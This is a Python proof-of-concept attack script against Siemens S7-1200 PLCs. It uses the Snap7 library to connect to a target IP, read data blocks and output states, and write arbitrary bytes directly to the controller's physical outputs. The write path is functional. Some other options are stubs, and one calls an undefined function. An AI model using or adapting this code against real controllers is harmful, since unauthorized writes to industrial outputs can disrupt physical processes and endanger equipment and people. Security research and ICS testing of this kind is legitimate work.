#!/usr/bin/python -tt

"""
ATTACK PROOF-OF-CONCEPT CODE UNSANCTIONED USE FORBIDDEN!

S7Comm attack aginst S7-1200 PLC.

 Tested against PLC S7-1200, CPU 1215C:
  1. PLC PUT/GET communication has to be enabled  (http://snap7.sourceforge.net/snap7_client.html);
  2. Will work for 'Full access', 'Read access', and 'HMI access' settings.

 Depends on:
  1. Snap7 (http://snap7.sourceforge.net/)
  2. Snap7-Python library (http://python-snap7.readthedocs.org/)

Resources:
  1. Snap7 Client: http://snap7.sourceforge.net/snap7_client.html
  2. Snap7 1200 notes: http://snap7.sourceforge.net/snap7_client.html#1200_1500
  3. S7comm explained http://gmiru.com/article/s7comm/
"""

import snap7
import sys

target_ip = input('Enter target IP: ')

plc = snap7.client.Client()
plc.connect(str(target_ip),0,1)

print('Connected to %s' % target_ip)

print('Chose what to do:')
print('1. Read from DB')
print('2. Read Output states')
print('3. Writing to DB')
print('4. Writing to Output')
print('5. Read PLC status')

item = int(input('Chose option: '))

def read_from_db(plc, db_num, mem_start, size=1):


	try:
		res = plc.db_read(db_num, mem_start, size)
	except Exception as err:
		print(err)
		return err
	return res

def read_from_outputs(plc, area, db_num, mem_start, size=1):
	'''q -> outputs'''
	try:
		res = plc.read_area(area, db_num, mem_start, size)
	except Exception as err:
		print(err)
		return err
	return res

def write_to_any(plc, area, db_num, mem_start, data):

	try:	
		res = plc.write_area(area, db_num, mem_start, data)
	except Exception as err:
		print(err)
		return err
	return res

def read_db_1(plc):
	db = int(input('Number of DB int: '))
	mem_start = int(input('Memory starting position int: '))
	size = int(input('Size in Bytes int: '))
	
	res = read_from_db(plc, db, mem_start, size)

	if res == 1:
		print('Unable to perform action')
	else:
		print(res)


def read_q_2(plc):
	area = 0x82
	db_num = 0  # 0 becouse are is digital inputs of PLC Q0...etc
	mem_start = int(input('Memory starting position int: '))
	size = int(input('Size in Bytes int: '))

	res = read_from_q(plc, area, db_num, mem_start, size)

	if res == 1:
		print('Unable to perform action')
	else:
		print(res)



def write_q_4(plc):
	area = 0x82
	db_num = 0  # 0 becouse are is digital inputs of PLC Q0...etc
	mem_start = int(input('Memory starting position int: '))
	data = bytearray(input('data to write in byte stream (\\x00\\x00) : ').encode())

	#data = 0x00

	print(data)

	print("------")

	
	
	res = write_to_any(plc, area, db_num, mem_start, data)

	print(res)


if item == 1:
	read_db_1(plc);
elif item == 2:
	read_q_2(plc);
elif item == 3:
	print('...')
elif item == 4:
	write_q_4(plc)
elif item == 5:
	print('...')
else:
	print('No such option! Exiting')


plc.disconnect()
plc.destroy()



